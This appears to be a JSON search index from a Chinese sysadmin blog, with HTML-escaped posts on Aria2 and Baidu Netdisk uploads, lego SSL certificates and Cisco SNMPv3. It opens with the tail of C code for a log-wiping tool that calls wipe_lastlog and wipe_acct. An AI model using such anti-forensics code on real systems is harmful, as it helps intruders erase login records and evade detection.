class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_lastlog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\t\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_lastlog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\t\t\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_lastlog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\t\t\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_lastlog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\t\t\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef NO_ACCT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\t\u003cspan class=\"cm\"\u003e/* ACCT */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;A\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003eusage\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"nf\"\u003ewipe_acct\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Linux下的擦除工具"},{"content":"南瓜视频最近被整改，一时陷入片荒。\n家里的电视机好不容易禁止升级，能用ES浏览器，挂上百度网盘，看存在里面的电影。\n但是，百度网盘现在基本是磁力和BT都失效了，没办法，只能想个办法看怎么下载并上传到百度网盘了。\n一、Aria2，用来下载BT和磁力文件。 安装Aria2，这个非常简单，就一个执行文件和一堆配置文件就行了。\nwget https://github.com/P3TERX/Aria2-Pro-Core/releases/download/1.35.0_2021.02.19/aria2-1.35.0-static-linux-amd64.tar.gz tar zxvf aria2-1.35.0-static-linux-amd64.tar.gz mkdir /root/.aria2 cd /root/.aria2 wget https://p3terx.github.io/aria2.conf/aria2.conf wget https://p3terx.github.io/aria2.conf/clean.sh wget https://p3terx.github.io/aria2.conf/core wget https://p3terx.github.io/aria2.conf/script.conf wget https://p3terx.github.io/aria2.conf/rclone.env wget https://p3terx.github.io/aria2.conf/upload.sh wget https://p3terx.github.io/aria2.conf/delete.sh wget https://p3terx.github.io/aria2.conf/dht.dat wget https://p3terx.github.io/aria2.conf/dht6.dat wget https://p3terx.github.io/aria2.conf/move.sh wget https://p3terx.github.io/aria2.conf/LICENSE touch aria2.session 注意这里是root用户运行，如果要用其他用户，修改/root/.aria2/aria2.conf里面的/root就行。\n然后再造个systemctl的启动控制文件：\ncat \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/systemd/system/aria2.service [Unit] Description=aria2 Service After=network.target Wants=network.target [Service] Type=simple ExecStart=/root/aria2c --conf-path=/root/.aria2/aria2.conf Restart=on-failure # Don\u0026#39;t restart in the case of configuration error RestartPreventExitStatus=23 [Install] WantedBy=multi-user.target EOF systemctl daemon-reload systemctl start aria2 注意，如果有防火墙，注意打开以下三个端口。\ntcp 6800 tcp 51413 udp 51413 然后就好了，然而但是，没有任何可用界面\n我们弄个界面吧，AriaNG，其实就需要一个文件，index.html\nwget https://github.com/mayswind/AriaNg/releases/download/1.2.1/AriaNg-1.2.1-AllInOne.zip 随便放到个web服务器上，然后打开配置一下\n然后就能随便去下载磁力链和BT了。\n然后呢，怎么传到百度云盘去呢？\n继续，用BaiduPCS-Go\nwget https://github.com/qjfoidnh/BaiduPCS-Go/releases/download/v3.7.9/BaiduPCS-Go-v3.7.9-linux-amd64.zip 然后用浏览器打开pan.baidu.com，F12调试，拿到Cookie中的BDUSS值\n先登录\n./BaiduPCS-Go login -bduss=xxxx 然后就可以上传了，注意，如果上传的目录名后面带/结尾，那会把目录下的东西传上去，如果不带/结尾，就上传整个目录，跟rsync的用法一样（很不错），然后去百度网盘的目录movies下就可以看到文件了。\n基本上是秒传，因为你下的东西99%的机率百度已经有了：\n./BaiduPCS-Go u 爱，死亡和机器人.Love.Death.and.Robots.S02 movies 然后打开电视机上的百度网盘，就可以自由观看了。\n","permalink":"https://rendoumi.com/posts/20240124-aria2_baidu/","summary":"\u003cp\u003e南瓜视频最近被整改，一时陷入片荒。\u003c/p\u003e\n\u003cp\u003e家里的电视机好不容易禁止升级，能用ES浏览器，挂上百度网盘，看存在里面的电影。\u003c/p\u003e\n\u003cp\u003e但是，百度网盘现在基本是磁力和BT都失效了，没办法，只能想个办法看怎么下载并上传到百度网盘了。\u003c/p\u003e\n\u003ch4 id=\"一aria2用来下载bt和磁力文件\"\u003e一、Aria2，用来下载BT和磁力文件。\u003c/h4\u003e\n\u003cp\u003e安装Aria2，这个非常简单，就一个执行文件和一堆配置文件就行了。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/P3TERX/Aria2-Pro-Core/releases/download/1.35.0_2021.02.19/aria2-1.35.0-static-linux-amd64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf aria2-1.35.0-static-linux-amd64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /root/.aria2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /root/.aria2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/aria2.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/clean.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/core\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/script.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/rclone.env\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/upload.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/delete.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/dht.dat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/dht6.dat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/move.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/LICENSE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etouch aria2.session\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意这里是root用户运行，如果要用其他用户，修改/root/.aria2/aria2.conf里面的/root就行。\u003c/p\u003e\n\u003cp\u003e然后再造个systemctl的启动控制文件：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/systemd/system/aria2.service \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Unit]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eDescription=aria2 Service\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eAfter=network.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eWants=network.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Service]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eType=simple\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eExecStart=/root/aria2c --conf-path=/root/.aria2/aria2.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eRestart=on-failure\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# Don\u0026#39;t restart in the case of configuration error\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eRestartPreventExitStatus=23\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Install]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eWantedBy=multi-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl daemon-reload\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl start aria2 \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，如果有防火墙，注意打开以下三个端口。\u003c/p\u003e","title":"Aria2下载网剧并极速上传到百度网盘"},{"content":"amce申请证书实在是太烦了，对于一台只有1cpu 512m的vps来说，装这个东西简直就是费时费劲。\n好在有人干脆开发了一个go语言的工具lego，这东西完全能够替代掉ACME\nhttps://github.com/go-acme/lego/ 只有一个执行文件，极简主义：\n申请证书一句话：\nlego --email=\u0026#34;foo@bar.com\u0026#34; --domains=\u0026#34;example.com\u0026#34; --http run 回答一下Yes\n然后生成的证书都放在.lego/certificates/目录下\n续费也是一句话\nlego --email=\u0026#34;foo@bar.com\u0026#34; --domains=\u0026#34;example.com\u0026#34; --http renew 及其简单，也方便搬迁。生成的证书crt是带证书链条的\n申请好就可以装trojan了。实在是方便\n如果DNS是托管在阿里云上，可以开一个阿里ram账号，然后用dns的api验证\nALICLOUD_ACCESS_KEY=aaaaaaaa ALICLOUD_SECRET_KEY=bbbbbbbb \\ ./lego --email admin@ddky.com --dns alidns --domains *.ddky.com run 如果DNS是托管在namesilo上，同样可以开一个api的key，时间一定要放长，否则不生效！\nNAMESILO_API_KEY=ccccc NAMESILO_PROPAGATION_TIMEOUT=3600 NAMESILO_POLLING_INTERVAL=120 NAMESILO_TTL=3600 \\ ./lego --email zhangranrui@gmail.com --dns namesilo --domains *.rendoumi.com run ","permalink":"https://rendoumi.com/posts/20240124-lego_acme/","summary":"\u003cp\u003eamce申请证书实在是太烦了，对于一台只有1cpu 512m的vps来说，装这个东西简直就是费时费劲。\u003c/p\u003e\n\u003cp\u003e好在有人干脆开发了一个go语言的工具lego，这东西完全能够替代掉ACME\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://github.com/go-acme/lego/ \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e只有一个执行文件，极简主义：\u003c/p\u003e\n\u003cp\u003e申请证书一句话：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e lego --email\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;foo@bar.com\u0026#34;\u003c/span\u003e --domains\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;example.com\u0026#34;\u003c/span\u003e --http run \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e回答一下Yes\u003c/p\u003e\n\u003cp\u003e然后生成的证书都放在.lego/certificates/目录下\u003c/p\u003e\n\u003cp\u003e续费也是一句话\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e lego --email\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;foo@bar.com\u0026#34;\u003c/span\u003e --domains\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;example.com\u0026#34;\u003c/span\u003e --http renew\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e及其简单，也方便搬迁。生成的证书crt是带证书链条的\u003c/p\u003e\n\u003cp\u003e申请好就可以装trojan了。实在是方便\u003c/p\u003e\n\u003cp\u003e如果DNS是托管在阿里云上，可以开一个阿里ram账号，然后用dns的api验证\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eALICLOUD_ACCESS_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eaaaaaaaa  \u003cspan class=\"nv\"\u003eALICLOUD_SECRET_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebbbbbbbb \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e./lego --email admin@ddky.com --dns alidns --domains *.ddky.com run\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如果DNS是托管在namesilo上，同样可以开一个api的key，时间一定要放长，否则不生效！\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNAMESILO_API_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eccccc \u003cspan class=\"nv\"\u003eNAMESILO_PROPAGATION_TIMEOUT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3600\u003c/span\u003e \u003cspan class=\"nv\"\u003eNAMESILO_POLLING_INTERVAL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e120\u003c/span\u003e \u003cspan class=\"nv\"\u003eNAMESILO_TTL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3600\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e./lego --email zhangranrui@gmail.com --dns namesilo --domains *.rendoumi.com run\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"用lego来代替acme申请免费ssl证书"},{"content":"https://www.cisco.com/c/en/us/support/docs/smb/routers/cisco-rv-series-small-business-routers/smb4127-configure-simple-network-management-protocol-snmp-on-rv320-a.html\n这篇说的很详细了\n按图索骥即可\nsnmpwalk v3参数解释：\n-v 1|2c|3 specifies SNMP version to use -u USER-NAME set security name (e.g. bert) -l LEVEL set security level (noAuthNoPriv|authNoPriv|authPriv) -a PROTOCOL set authentication protocol (MD5|SHA) -A PASSPHRASE set authentication protocol pass phrase -x PROTOCOL set privacy protocol (DES|AES) -X PASSPHRASE set privacy protocol pass phrase 简单说，v3支持两重加密，要输入两个密码\nsnmpset -v3 -u Cisco -l authPriv -a MD5 -A FuckCisco -x DES -X zhenbushidongxi 192.168.1.1 .1.3.6.1.4.1.9.2.9.9.0 i 2 ","permalink":"https://rendoumi.com/posts/20240124-cisco_snmp3/","summary":"\u003cp\u003e\u003ca href=\"https://www.cisco.com/c/en/us/support/docs/smb/routers/cisco-rv-series-small-business-routers/smb4127-configure-simple-network-management-protocol-snmp-on-rv320-a.html\"\u003ehttps://www.cisco.com/c/en/us/support/docs/smb/routers/cisco-rv-series-small-business-routers/smb4127-configure-simple-network-management-protocol-snmp-on-rv320-a.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e这篇说的很详细了\u003c/p\u003e\n\u003cp\u003e按图索骥即可\u003c/p\u003e\n\u003cp\u003esnmpwalk v3参数解释：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-v 1\u003cspan class=\"p\"\u003e|\u003c/span\u003e2c\u003cspan class=\"p\"\u003e|\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e             specifies SNMP version to use\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-u USER-NAME          \u003cspan class=\"nb\"\u003eset\u003c/span\u003e security name \u003cspan class=\"o\"\u003e(\u003c/span\u003ee.g. 